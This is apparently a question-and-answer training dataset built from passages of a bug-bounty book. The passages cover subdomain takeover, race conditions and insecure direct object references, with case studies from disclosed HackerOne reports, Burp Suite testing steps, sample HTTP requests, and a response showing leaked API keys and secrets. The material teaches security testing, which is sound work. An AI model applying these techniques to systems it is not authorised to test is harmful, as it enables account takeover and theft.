time through the subdomain.\nTakeaways\nBe on the lookout for sites pointing to services that return error\nmessages. When you find an error, confirm how those services are\nused by reading their documentation. Then check whether you can\nfind misconfigurations that allow you to take over the subdomain.\nAdditionally, always go the extra steps to confirm what you think are\nvulnerabilities. In this case, Ebrietas looked up the SSL certificate\ninformation to confirm that Snapchat owned the domain before\nreporting. Then he configured his server to receive requests, making\nsure Snapchat was using the domain.\n259\nDownload from www.finelybook.com 7450911@qq.com\nLEGAL ROBOT TAKEOVER\nDifficulty: Medium\nURL: https://api.legalrobot.com/\nSource: https://hackerone.com/reports/148770/\nDate reported: July 1, 2016\nBounty paid: $100\nEven when sites configure their subdomains correctly on third-party\nservices, those services may themselves be vulnerable to\nmisconfigurations. This is what Frans Rosen found on July 1, 2016,\nwhen he submitted a report to Legal Robot. He notified the company\nthat he had a DNS CNAME entry for api.legalrobot.com pointing to\nModulus.io, which he could take over.\nAs you likely recognize by now, after seeing such an error page, a\nhacker’s next step should be to visit the service to claim the\nsubdomain. But attempting to claim api.legalrobot.com resulted in an\nerror because Legal Robot had already claimed it.\nInstead of walking away, Rosen tried to claim the wildcard\nsubdomain for Legal Robot, *.legalrobot.com, which was available.\nModulus’s configuration allowed for wildcard subdomains to override\nmore specific subdomains, which included api.legalrobot.com in this\ncase. After claiming the wildcard domain, Rosen was able to host his\nown content at api.legalrobot.com, as shown in Figure 14-1.\nFigure 14-1: HTML page source provided as a proof of concept for the subdomain\n260\nDownload from www.finelybook.com 7450911@qq.com\ntakeover claimed by Frans Rosen\nNote the content Rosen hosted in Figure 14-1. Rather than\npublishing an embarrassing page stating the subdomain had been\ntaken over, he used a nonintrusive text page with an HTML comment\nverifying that he was responsible for the content.\nTakeaways\nWhen sites rely on third-party services to host a subdomain, they’re\nrelying on the security of that service as well. In this case, Legal\nRobot thought it had properly claimed its subdomain on Modulus\nwhen in fact the service had a vulnerability that allowed wildcard\nsubdomains to override all other subdomains. Also keep in mind that\nif you’re able to claim a subdomain, it’s best to use a nonintrusive\nproof of concept to avoid embarrassing the company you’re reporting\nto.\nUBER SENDGRID MAIL TAKEOVER\nDifficulty: Medium\nURL: https://em.uber.com/\nSource: https://hackerone.com/reports/156536/\nDate reported: August 4, 2016\nBounty paid: $10,000\nSendGrid is a cloud-based email service. At the time of this writing,\nUber was one of its customers. As the hacker Rojan Rijal was\nreviewing Uber’s DNS records, he noticed a CNAME record for\nem.uber.com pointing to SendGrid.\nBecause Uber had a SendGrid CNAME, Rijal decided to poke\n261\nDownload from www.finelybook.com 7450911@qq.com\naround the service to confirm how Uber was configured. His first step\nwas to confirm the services provided by SendGrid and whether it\nallowed for content hosting. It didn’t. Digging into the SendGrid\ndocumentation, Rijal came across a different option called white\nlabeling. White labeling is a functionality that allows internet service\nproviders to confirm that SendGrid has a domain’s permission to send\nan email on the domain’s behalf. This permission is granted by\ncreating mail exchanger (MX), records for a site that points to\nSendGrid. An MX record is a type of DNS record that specifies a mail\nserver responsible for sending and receiving email on behalf of a\ndomain. Recipient email servers and services query DNS servers for\nthese records to verify an email’s authenticity and to prevent spam.\nThe white labeling functionality caught Rijal’s eye because it\ninvolved trusting a third-party service provider to manage an Uber\nsubdomain. When Rijal reviewed the DNS entries for em.uber.com, he\nconfirmed that an MX record was pointing to mx.sendgrid.net. But\nonly site owners can create DNS records (assuming there’s no other\nvulnerability to abuse), so Rijal couldn’t modify Uber’s MX records\ndirectly to takeover the subdomain. Instead, he turned to SendGrid’s\ndocumentation, which described another service called Inbound Parse\nWebhook. This service allows customers to parse attachments and\ncontents of incoming emails, then send the attachments to a specified\nURL. To use the functionality, sites need to:\n1. Create an MX record of a domain/hostname or subdomain and point it to\nmx.sendgrid.net.\n2. Associate the domain/hostname and a URL in the parse API settings page\nwith the Inbound Parse Webhook.\nBingo. Rijal already confirmed that the MX record existed, but\n262\nDownload from www.finelybook.com 7450911@qq.com\nUber hadn’t set up the second step. Uber hadn’t claimed the\nem.uber.com subdomain as an Inbound Parse Webhook. Rijal claimed\nthe domain as his own and set up a server to receive the data sent by\nthe SendGrid parse API. After confirming he could receive emails, he\nstopped intercepting them and reported the issue to Uber and\nSendGrid. As part of the fix, SendGrid confirmed that it had added an\nadditional security check, requiring accounts to verify their domain\nbefore allowing an Inbound Parse Webhook. As a result, the security\ncheck should protect other sites from a similar exploit.\nTakeaways\nThis report demonstrates how valuable third-party documentation can\nbe. By reading the developer documentation, learning what services\nSendGrid provides, and identifying how those services are configured,\nRijal found a vulnerability in the third-party service that impacted\nUber. It’s incredibly important to explore all functionality that third-\nparty services offer when a target site is using their services.\nEdOverflow maintains a list of vulnerable services, which you can\nfind at https://github.com/EdOverflow/can-i-take-over-xyz/. But even\nif his list identifies a service as protected, be sure to double check or\nlook for alternative methods, like Rijal did.\nSUMMARY\nSubdomain takeovers can simply be caused by a site with an\nunclaimed DNS entry pointing to a third-party service. Examples in\nthis chapter include Heroku, Fastly, S3, Zendesk, SendGrid, and\nunregistered domains, but other services are also vulnerable to this\ntype of bug. You can find these vulnerabilities using tools like\n263\nDownload from www.finelybook.com 7450911@qq.com\nKnockPy, crt.sh, and censys.io as well as other tools in Appendix A.\nManaging a takeover might require additional ingenuity, such as\nwhen Rosen claimed a wildcard domain and Rijal registered a custom\nwebhook. When you’ve found a potential vulnerability, but the basic\nmethods to exploit it don’t work, be sure to read the service\ndocumentation. Additionally, explore all functionality offered\nregardless of whether the target site is using it or not. When you do\nfind a takeover, be sure to provide proof of the vulnerability, but do so\nin a respectful and unobtrusive way.\n264"
  },
  {
    "input": "What are race conditions, and how can they occur in web applications, particularly when dealing with actions that involve database lookups, updates, and time-sensitive processes like HTTP requests and background jobs?",
    "summary": "A race condition occurs when two processes compete to complete based on an initial condition that becomes invalid during execution. This can lead to unexpected results, such as a bank account being overdrawn if two transfer requests are processed simultaneously. Examples include accepting a HackerOne invite multiple times and bypassing Keybase's invitation limits. The Shopify Partners platform had a critical race condition where a partner could gain unauthorized access to a store by manipulating email verification and account requests.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n15\nRACE CONDITIONS\nA race condition occurs when two processes race to complete based\non an initial condition that becomes invalid while the processes are\nexecuting. A classic example is transferring money between bank\naccounts:\n1. You have $500 in your bank account, and you need to transfer the entire\namount to a friend.\n2. Using your phone, you log into your banking app and request a transfer of\n$500 to your friend.\n3. After 10 seconds, the request is still processing. So you log into the\nbanking site on your laptop, see that your balance is still $500, and request\nthe transfer again.\n4. The laptop and mobile requests finish within a few seconds of each other.\n5. Your bank account is now $0.\n6. Your friend messages you to say he received $1,000.\n7. You refresh your account, and your balance is still $0.\nAlthough this is an unrealistic example of a race condition, because\n(hopefully) all banks prevent money from just appearing out of thin\n265\nDownload from www.finelybook.com 7450911@qq.com\nair, the process represents the general concept. The condition for the\ntransfers in steps 2 and 3 is that you have enough money in your\naccount to initiate a transfer. But your account balance is validated\nonly at the start of each transfer process. When the transfers execute,\nthe initial condition is no longer valid, but both processes still\ncomplete.\nHTTP requests can seem instantaneous when you have a fast\ninternet connection, but processing requests still takes time. While\nyou’re logged into a site, every HTTP request you send must be\nreauthenticated by the receiving site; additionally, the site must load\nthe data necessary for your requested action. A race condition could\noccur in the time it takes the HTTP request to complete both tasks.\nThe following are examples of race condition vulnerabilities found in\nweb applications.\nACCEPTING A HACKERONE INVITE\nMULTIPLE TIMES\nDifficulty: Low\nURL: hackerone.com/invitations/<INVITE_TOKEN>/\nSource: https://hackerone.com/reports/119354/\nDate reported: February 28, 2016\nBounty paid: Swag\nWhen you’re hacking, watch for situations where your action depends\non a condition. Look for any actions that seem to execute a database\nlookup, apply application logic, and update a database.\nIn February 2016, I was testing HackerOne for unauthorized access\nto program data. The invite functionality that adds hackers to\n266\nDownload from www.finelybook.com 7450911@qq.com\nprograms and members to teams caught my eye.\nAlthough the invitation system has since changed, at the time of\nmy testing, HackerOne emailed invites as unique links that weren’t\nassociated with the recipient email address. Anyone could accept an\ninvitation, but the invite link was meant to be accepted only once and\nused by a single account.\nAs bug hunters, we can’t see the actual process the site uses to\naccept invitations, but we can still guess how the application works\nand use our assumptions to find bugs. HackerOne used a unique,\ntoken-like link for invites. So, most likely, the application would look\nup the token in a database, add an account based on the database’s\nentry, and then update the token record in the database so the link\ncouldn’t be used again.\nThis type of workflow can cause race conditions for two reasons.\nFirst, the process of looking up a record and then acting on the record\nusing coding logic creates a delay. The lookup is the precondition that\nmust be met to initiate the invite process. If the application code is\nslow, two near-instantaneous requests could both perform the lookup\nand satisfy their conditions to execute.\nSecond, updating records in the database can create a delay\nbetween the condition and the action that modifies the condition. For\nexample, updating records requires looking through the database table\nto find the record to update, which takes time.\nTo test whether a race condition existed, I created a second and\nthird account in addition to my primary HackerOne account (I’ll refer\nto the accounts as Users A, B, and C). As User A, I created a program\nand invited User B to it. Then I logged out as User A. I received the\ninvite email as User B and logged into that account in my browser. I\nlogged in as User C in another private browser and opened the same\n267\nDownload from www.finelybook.com 7450911@qq.com\ninvite.\nNext, I lined up the two browsers and invite acceptance buttons so\nthey were almost on top of each other, as shown in Figure 15-1.\nFigure 15-1: Two stacked browser windows showing the same HackerOne invite\nThen I clicked both Accept buttons as quickly as possible. My first\nattempt didn’t work, which meant I had to go through the process\nagain. But my second attempt was successful, and I managed to add\ntwo users to a program using one invite.\nTakeaways\nIn some cases, you can manually test for race conditions—although\nyou might need to adapt your workflow so you can perform actions as\nquickly as possible. In this case, I could arrange the buttons side by\n268\nDownload from www.finelybook.com 7450911@qq.com\nside, which made the exploit possible. In situations where you need to\nperform complicated steps, you might not be able to use manual\ntesting. Instead, automate your testing so you can perform actions\nalmost simultaneously.\nEXCEEDING KEYBASE INVITATION\nLIMITS\nDifficulty: Low\nURL: https://keybase.io/_/api/1.0/send_invitations.json/\nSource: https://hackerone.com/reports/115007/\nDate reported: February 5, 2015\nBounty paid: $350\nLook for race conditions in situations when a site has a limit to the\nnumber of actions you’re permitted to perform. For example, the\nsecurity app Keybase limited the number of people allowed to sign up\nby providing registered users with three invites. As in the previous\nexample, hackers could guess how Keybase was limiting invitations:\nmost likely, Keybase was receiving the request to invite another user,\nchecking the database to see whether the user had invites left,\ngenerating a token, sending the invite email, and decrementing the\nnumber of invites the user had left. Josip Franjković recognized that\nthis behavior could be vulnerable to a race condition.\nFranjković visited the URL https://keybase.io/account/invitations/\nwhere he could send invites, enter email addresses, and submit\nmultiple invites simultaneously. Unlike with HackerOne’s invitation\nrace condition, sending multiple invitations would be difficult to do\nmanually, so Franjković likely used Burp Suite to generate the invite\n269\nDownload from www.finelybook.com 7450911@qq.com\nHTTP requests.\nUsing Burp Suite, you can send requests to the Burp Intruder,\nwhich allows you to define an insertion point in HTTP requests. You\ncan specify payloads to iterate through for each HTTP request and add\nthe payload to the insertion point. In this case, had Franjković been\nusing Burp, he would have specified multiple email addresses as the\npayloads and had Burp send each request simultaneously.\nAs a result, Franjković was able to bypass the three-user limit and\ninvite seven users to the site. Keybase confirmed the faulty design\nwhen resolving the issue and addressed the vulnerability by using a\nlock. A lock is a programmatic concept that restricts access to\nresources so other processes can’t access them.\nTakeaways\nIn this case, Keybase accepted the invitation race condition, but not all\nbug bounty programs will pay an award for vulnerabilities with minor\nimpact, as demonstrated earlier in “Accepting a HackerOne Invite\nMultiple Times” on page 150.\nHACKERONE PAYMENTS RACE\nCONDITION\nDifficulty: Low\nURL: N/A\nSource: Undisclosed\nDate reported: April 12, 2017\nBounty paid: $1,000\nSome websites update records based on your interactions with them.\n270\nDownload from www.finelybook.com 7450911@qq.com\nFor example, when you submit a report on HackerOne, the submission\ntriggers an email that is sent to the team you submitted to, which\ntriggers an update to the team’s stats.\nBut some actions, such as payments, don’t occur immediately in\nresponse to an HTTP request. For instance, HackerOne uses a\nbackground job to create money transfer requests for payment\nservices like PayPal. Background job actions are usually performed in\na batch and are initiated by some trigger. Sites commonly use them\nwhen they need to process a lot of data, but they’re independent from\na user’s HTTP request. This means that when a team awards you a\nbounty, the team will get a receipt for the payment as soon as your\nHTTP request is processed, but the money transfer will be added to a\nbackground job to be completed later.\nBackground jobs and data processing are important components in\nrace conditions because they can create a delay between the act of\nchecking the conditions (time of check) and the act of completing the\nactions (time of use). If a site only checks for conditions when adding\nsomething to a background job, but not when the condition is actually\nused, the site’s behavior can lead to a race condition.\nIn 2016, HackerOne began combining bounties awarded to hackers\ninto a single payment when using PayPal as the payment processor.\nPreviously, when you were awarded multiple bounties in a day, you\nwould receive separate payments from HackerOne for each bounty.\nAfter the change, you’d receive a lump sum payment for all the\nbounties.\nIn April 2017, Jigar Thakkar tested this functionality and\nrecognized he could duplicate payouts. During the payment process,\nHackerOne would collect the bounties according to email address,\ncombine them into one amount, and then send the payment request to\n271\nDownload from www.finelybook.com 7450911@qq.com\nPayPal. In this case, the precondition was looking up the email\naddresses associated with the bounties.\nThakkar found that if two HackerOne users had the same email\naddress registered with PayPal, HackerOne would combine the\nbounties into a single payment for that single Paypal address. But if\nthe user who found the bug changed their PayPal address after the\nbounty payments were combined but before HackerOne’s background\njob sent the request to PayPal, the lump sum payment would go to\nboth the original PayPal address and the new email address that the\nuser who found the bug changed it to.\nAlthough Thakkar successfully tested this bug, exploiting\nbackground jobs can be tricky: you have to know when the processing\ninitiates, and you only have a few seconds to modify the conditions.\nTakeaways\nIf you notice a site is performing actions well after you’ve visited it,\nit’s likely using a background job to process data. This is an\nopportunity for testing. Change the conditions that define the job and\ncheck whether the job is processed using the new conditions instead of\nthe old ones. Be sure to test the behavior as though the background job\nwould execute immediately—background processing can often occur\nquickly, depending on how many jobs have been queued and the site’s\napproach to processing data.\nSHOPIFY PARTNERS RACE CONDITION\nDifficulty: High\nURL: N/A\nSource: https://hackerone.com/reports/300305/\n272\nDownload from www.finelybook.com 7450911@qq.com\nDate reported: December 24, 2017\nBounty paid: $15,250\nPreviously disclosed reports can tell you where to find more bugs.\nTanner Emek used this strategy to find a critical vulnerability in\nShopify’s Partners platform. The bug allowed Emek to access any\nShopify store as long as he knew the email address belonging to a\nstore’s current staff member.\nShopify’s Partner platform allows shop owners to give partnered\ndevelopers access to their stores. Partners request access to Shopify\nstores through the platform, and the store owners must approve the\nrequest before partners can access the store. But to send a request, a\npartner must have a verified email address. Shopify verifies email\naddresses by sending a unique Shopify URL to the supplied email\naddress. When the partner accesses the URL, the email address is\nconsidered verified. This process occurs whenever a partner registers\nan account or changes their email address on an existing account.\nIn December 2017, Emek read a report written by @uzsunny that\nwas awarded $20,000. The report revealed a vulnerability that allowed\n@uzsunny to access any Shopify store. The bug occurred when two\npartner accounts shared the same email and requested access to the\nsame store one after another. Shopify’s code would automatically\nconvert a store’s existing staff account to a collaborator account.\nWhen a partner had a preexisting staff account on a store and\nrequested collaborator access from the Partners platform, Shopify’s\ncode automatically accepted and converted the account to a\ncollaborator account. In most situations, this conversion made sense\nbecause the partner already had access to the store with a staff\naccount.\n273\nDownload from www.finelybook.com 7450911@qq.com\nBut the code didn’t properly check what type of existing account\nwas associated with the email address. An existing collaborator\naccount in the “pending” state, not yet accepted by the store owner,\nwould be converted to an active collaborator account. The partner\nwould effectively be able to approve their own collaborator request\nwithout the store owner’s interaction.\nEmek recognized that the bug in @uzsunny’s report relied on\nbeing able to send a request through a verified email address. He\nrealized that if he could create an account and change the account’s\nemail address to one that matched a staff member’s email, he might be\nable to use the same method as @uzsunny to maliciously convert the\nstaff account to a collaborator account he controlled. To test whether\nthis bug was possible through a race condition, Emek created a partner\naccount using an email address he controlled. He received a\nverification email from Shopify but didn’t visit the URL right away.\nInstead, in the Partner platform, he changed his email address to\ncache@hackerone.com, an address he didn’t own, and intercepted the\nemail change request using Burp Suite. He then clicked and\nintercepted the verification link to validate his email address. Once he\nhad intercepted both HTTP requests, Emek used Burp to send the\nemail change request and verification request one after the other,\nalmost simultaneously.\nAfter sending the requests, Emek reloaded the page and found\nShopify had executed the change request and the verification request.\nThese actions caused Shopify to validate Emek’s email address as\ncache@hackerone.com. Requesting collaborator access to any\nShopify store that had an existing staff member with the email address\ncache@hackerone.com would allow Emek access to that store without\nany administrator interaction. Shopify confirmed the bug was due to a\n274"
  },
  {
    "input": "",
    "summary": "",
    "output": "Download from www.finelybook.com 7450911@qq.com\nrace condition in the application’s logic when changing and verifying\nemail addresses. Shopify fixed the bug by locking the account\ndatabase record during each action and requiring store administrators\nto approve all collaborator requests.\nTakeaways\nRecall from the “HackerOne Unintended HTML Inclusion” report on\npage 44 that fixing one vulnerability doesn’t fix all vulnerabilities\nassociated with an application’s functionality. When a site discloses\nnew vulnerabilities, read the report and retest the application. You\nmight not find any issues, you might bypass the developer’s intended\nfix, or you might find a new vulnerability. At a minimum, you’ll\ndevelop new skills by testing that functionality. Thoroughly test any\nverification systems, thinking about how developers could have coded\nthe functionality and whether it could be vulnerable to a race\ncondition.\nSUMMARY\nAny time a site performs actions that depend on a condition being true\nand changes the condition as a result of the action being performed,\nthere’s an opportunity for race conditions. Be on the lookout for sites\nthat limit the number of actions you’re permitted to perform or that\nprocess actions using background jobs. A race condition vulnerability\nusually requires conditions to change very quickly, so if you think\nsomething is vulnerable, you might need multiple attempts to actually\nexploit the behavior.\n275\nDownload from www.finelybook.com 7450911@qq.com\n16\nINSECURE DIRECT OBJECT\nREFERENCES\nAn insecure direct object reference (IDOR) vulnerability occurs when\nan attacker can access or modify a reference to an object, such as a\nfile, database record, account, and so on, that should be inaccessible to\nthem. For example, let’s say the website www.<example>.com has\nprivate user profiles that should be accessible only to the profile\nowner through the URL www.<example>.com/user?id=1. The id\nparameter would determine which profile you’re viewing. If you can\naccess someone else’s profile by changing the id parameter to 2, that\nwould be an IDOR vulnerability.\nFINDING SIMPLE IDORS\nSome IDOR vulnerabilities are easier to find than others. The easiest\nIDOR vulnerability you’ll find is similar to the previous example: it’s\none in which the identifier is a simple integer that automatically\nincrements as new records are created. To test for this kind of IDOR,\nyou just add or subtract 1 from an id parameter and confirm you can\n276\nDownload from www.finelybook.com 7450911@qq.com\naccess records you shouldn’t have access to.\nYou can perform this testing using the web proxy tool Burp Suite,\ndiscussed in Appendix A. A web proxy captures the traffic your\nbrowser sends to a website. Burp allows you to monitor HTTP\nrequests, modify them on the fly, and replay requests. To test for\nIDORs, you can send your request to Burp’s Intruder, set a payload on\nthe id parameter, and choose a numerical payload to increment or\ndecrement.\nAfter starting a Burp Intruder attack, you can see whether you have\naccess to data by checking the content lengths and HTTP response\ncodes Burp receives. For example, if a site you’re testing always\nreturns status code 403 responses that are all the same content length,\nthe site is likely not vulnerable. Status code 403 means access has\nbeen denied, so uniform content lengths indicate you’re receiving a\nstandard access denied message. But if you receive a status code 200\nresponse and a variable content length, you might have accessed\nprivate records.\nFINDING MORE COMPLEX IDORS\nComplex IDORs can occur when the id parameter is buried in a POST\nbody or is not readily identifiable through the parameter name. You’ll\nlikely encounter unobvious parameters, such as ref, user, or column\nbeing used as IDs. Even when you can’t easily pick out the ID by its\nparameter name, you might identify the parameter if it takes integer\nvalues. When you find a parameter that takes an integer value, test it\nto see how the site behavior changes when the ID is modified. Again,\nyou can use Burp to help make this easy by intercepting HTTP\nrequests, changing the ID, and using the Repeater tool to replay the\n277\nDownload from www.finelybook.com 7450911@qq.com\nrequest.\nIDORs are even harder to identify when sites use randomized\nidentifiers, such universal unique identifiers (UUIDs). UUIDs are 36-\ncharacter alphanumeric strings that don’t follow a pattern. If you\ndiscover a site that uses UUIDs, it will be nearly impossible to find a\nvalid record or object by testing random values. Instead, you can\ncreate two records and switch between them during your testing. For\nexample, let’s say you’re trying to access user profiles that are\nidentified using a UUID. Create your profile with user A; then log in\nas user B to try to access user A’s profile using its UUID.\nIn some cases, you’ll be able to access objects that use UUIDs. But\na site might not consider this a vulnerability because UUIDs are made\nto be unguessable. In those cases, you’ll need to look for opportunities\nwhere the site is disclosing the random identifier in question. Let’s say\nyou’re on a team-based site and the users are identified by UUIDs.\nWhen you invite a user to your team, the HTTP response to the\ninvitation might disclose their UUID. In other situations, you might be\nable to search for a record on a website and get a returned result that\nincludes the UUID. When you can’t find obvious places where UUIDs\nare being leaked, review the HTML page source code included in\nHTTP responses, which might disclose information that isn’t readily\nvisible on the site. You can do this by monitoring requests in Burp or\nby right-clicking in your web browser and selecting View Page\nSource.\nEven if you can’t find a leaked UUID, some sites will reward the\nvulnerability if the information is sensitive and clearly violates their\npermission model. It’s your responsibility to explain to the company\nwhy you believe you’ve found an issue they should address and what\nimpact you’ve determined the vulnerability has. The following\n278\nDownload from www.finelybook.com 7450911@qq.com\nexamples demonstrate the range of difficulty in finding IDOR\nvulnerabilities.\nBINARY.COM PRIVILEGE ESCALATION\nDifficulty: Low\nURL: www.binary.com\nSource: https://hackerone.com/reports/98247/\nDate reported: November 6, 2015\nBounty paid: $300\nWhen you’re testing web applications that use accounts, you should\nregister two different accounts and test them simultaneously. Doing so\nallows you to test for IDORs between two different accounts you\ncontrol and know what to expect from. This is the approach Mahmoud\nGamal took when discovering an IDOR in binary.com.\nThe website binary.com is a trading platform that allows users to\ntrade currencies, indices, stocks, and commodities. At the time of this\nreport, the URL www.binary.com/cashier would render an iFrame\nwith a src attribute that referenced the subdomain cashier.binary.com\nand passed URL parameters, such as pin, password, and secret, to the\nwebsite. These parameters were likely intended to authenticate users.\nBecause the browser was accessing www.binary.com/cashier, the\ninformation being passed to cashier.binary.com wouldn’t be visible\nwithout viewing the HTTP requests being sent by the website.\nGamal noticed that the pin parameter was being used as an account\nidentifier and that it appeared to be an easily guessed numerically\nincremented integer. Using two different accounts, which we’ll refer\nto as account A and account B, he visited the /cashier path on account\n279\nDownload from www.finelybook.com 7450911@qq.com\nA, noted the pin parameter, and then logged into account B. When he\nmodified account B’s iFrame to use account A’s pin, he was able to\naccess account A’s information and request withdrawals while\nauthenticated as account B.\nThe team at binary.com resolved the report within a day of\nreceiving it. They claimed that they manually reviewed and approved\nwithdrawals, and so they would have noticed suspicious activity.\nTakeaways\nIn this case, a hacker easily tested the bug manually by using a\ncustomer pin from one account while logged in as a different account.\nYou can also use Burp plug-ins, such as Autorize and Authmatrix, to\nautomate this type of testing.\nBut finding obscure IDORs can be more difficult. This site was\nusing an iFrame, which can make the vulnerable URL and its\nparameters easy to miss because you wouldn’t see them in your\nbrowser without viewing the HTML page source. The best way to\ntrack iFrames and cases where multiple URLs might be accessed by a\nsingle web page is to use a proxy like Burp. Burp will record any GET\nrequests to other URLs, like cashier.binary.com, in the proxy history,\nmaking catching requests easier for you.\nMONEYBIRD APP CREATION\nDifficulty: Medium\nURL: https://moneybird.com/user/applications/\nSource: https://hackerone.com/reports/135989/\nDate reported: May 3, 2016\n280\nDownload from www.finelybook.com 7450911@qq.com\nBounty paid: $100\nIn May 2016, I began testing Moneybird for vulnerabilities, focusing\non its user account permissions. To do this, I created a business with\naccount A and then invited a second user, account B, to join with\nlimited permissions. Moneybird defines permissions that it assigns to\nadded users, such as the ability to use invoices, estimates, and so on.\nA user with full permissions could create apps and enable API\naccess. For example, a user could submit a POST request to create an\napp with full permissions, which would look like the following:\nPOST /user/applications HTTP/1.1\nHost: moneybird.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nDNT: 1\nReferer: https://moneybird.com/user/applications/new\nCookie: _moneybird_session=REDACTED; trusted_computer=\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 397\nutf8=%E2%9C%93&authenticity_token=REDACTED&doorkeeper_application%5Bname%\n5D=TW\nDApp&token_type=access_token&➊administration_id=ABCDEFGHIJKLMNOP&scopes%\n5B%5D\n=sales_invoices&scopes%5B%5D=documents&scopes%5B%5D=estimates&scopes%5B%5\nD=ban\nk&scopes%5B%5D=settings&doorkeeper_application%5Bredirect_uri%5D=&commit=Save\nAs you can see, the POST body includes the administration_id ➊\nparameter. This is the account ID that users are added to. Although the\nlength and randomness of the ID make it difficult to guess, the ID was\nimmediately disclosed to added users when they visited the account\n281\nDownload from www.finelybook.com 7450911@qq.com\nthat invited them. For example, when account B logged in and visited\naccount A, they would be redirected to the URL\nhttps://moneybird.com/ABCDEFGHIJKLMNOP/, where\nABCDEFGHIJKLMNOP would be the administration_id for account A.\nI tested to see if account B could create an application for account\nA’s business without the proper permission to do so. I logged in as\naccount B and created a second business, which account B was the\nsole member of. This would give account B full permissions on the\nsecond business, even though account B should have had limited\npermissions to account A and no ability to create apps for it.\nNext, I visited account B’s settings page, created an app, and using\nBurp Suite, intercepted the POST call to replace administration_id with\naccount A’s ID. Forwarding the modified request confirmed that the\nvulnerability worked. As account B, I had an app with full\npermissions to account A. This allowed account B to bypass the\nlimited permissions of their account and use the newly created app to\nperform any action they otherwise shouldn’t have had access to.\nTakeaways\nLook for parameters that could contain ID values, such as any\nparameter names that include the characters id. Especially be on the\nlookout for parameter values that only include numbers, because those\nIDs are likely to be generated in some guessable way. If you can’t\nguess an ID, determine whether it’s being leaked somewhere. I\nnoticed the administrator_id given the ID reference in its name.\nAlthough the ID values didn’t follow a guessable pattern, the value\nwas being disclosed in the URL whenever a user was invited to a\ncompany.\n282\nDownload from www.finelybook.com 7450911@qq.com\nTWITTER MOPUB API TOKEN THEFT\nDifficulty: Medium\nURL: https://mopub.com/api/v3/organizations/ID/mopub/activate/\nSource: https://hackerone.com/reports/95552/\nDate reported: October 24, 2015\nBounty paid: $5,040\nAfter discovering any vulnerability, make sure to consider the impact\nit would have if an attacker abused it. In October 2015, Akhil Reni\nreported that Twitter’s Mopub application (a 2013 acquisition) was\nvulnerable to an IDOR that leaked API keys and a secret. But several\nweeks later, Reni realized the vulnerability was more severe than he\ninitially reported and submitted an update. Luckily, he made his\nupdate before Twitter paid a bounty for his vulnerability.\nWhen Reni initially submitted his report, he found that a Mopub\nendpoint hadn’t properly authorized users and would leak an\naccount’s API key and build_secret in a POST response. Here’s what the\nPOST request looked like:\nPOST /api/v3/organizations/5460d2394b793294df01104a/mopub/activate HTTP/1.1\nHost: fabric.io\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101\nFirefox/41.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: 0jGxOZOgvkmucYubALnlQyoIlsSUBJ1VQxjw0qjp73A=\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CRASHLYTICS-DEVELOPER-TOKEN: 0bb5ea45eb53fa71fa5758290be5a7d5bb867e77\nX-Requested-With: XMLHttpRequest\nReferer: https://fabric.io/img-srcx-onerrorprompt15/android/apps/app\n.myapplication/mopub\n283\nDownload from www.finelybook.com 7450911@qq.com\nContent-Length: 235\nCookie: <redacted>\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\ncompany_name=dragoncompany&address1=123 street&address2=123&city=hollywood&\nstate=california&zip_code=90210&country_code=US&link=false\nAnd the response to the request was the following:\n{\"mopub_identity\":{\"id\":\"5496c76e8b15dabe9c0006d7\",\"confirmed\":true,\"primary\":\nfalse,\"service\":\"mopub\",\"token\":\"35592\"},➊\"organization\":{\"id\":\"5460d2394b793\n294df01104a\",\"name\":\"test\",\"alias\":\"test2\",➋\"api_key\":\"8590313c7382375063c2fe\n279a4487a98387767a\",\"enrollments\":{\"beta_distribution\":\"true\"},\"accounts\n_count\":3,\"apps_counts\":{\"android\":2},\"sdk_organization\":true,➌\"build\n_secret\":\"5ef0323f62d71c475611a635ea09a3132f037557d801503573b643ef8ad82054\",\n\"mopub_id\":\"33525\"}}\nMopub’s POST response provides the api_key ➋ and build_secret ➌,\nwhich Reni reported to Twitter in his initial report. But accessing the\ninformation also requires knowing an organization_id ➊, which is an\nunguessable 24-digit string. Reni noticed that users could share\napplication crash issues publicly via a URL, such as\nhttp://crashes.to/s/<11 CHARACTERS>. Visiting one of these URLs\nwould return the unguessable organization_id in the response body. Reni\nwas able to enumerate organization_id values by visiting the URLs\nreturned using the Google dork site:http://crashes.to/s/. With the\napi_key, build_secret, and organization_id, an attacker could steal API\ntokens.\nTwitter resolved the vulnerability and asked Reni to confirm he\ncould no longer access the vulnerable information. It was at that point\nthat Reni realized the build_secret returned in the HTTP response was\nalso used in the URL https://app.mopub.com/complete/htsdk/?code=\n284"
  },
  {
    "input": "What are the key considerations when identifying and reporting OAuth vulnerabilities, and how can attackers exploit them to gain unauthorized access to user accounts?",
    "summary": "The text discusses various OAuth vulnerabilities, including issues with redirect_uri validation, improper handling of authentication tokens, and misconfigured permissions. It highlights examples like the Slack OAuth token theft and Microsoft's redirect parameter flaw, where attackers could gain unauthorized access. Key takeaways emphasize the importance of thoroughly testing OAuth implementations, checking for leaked identifiers, and considering forgotten assets when searching for vulnerabilities.",
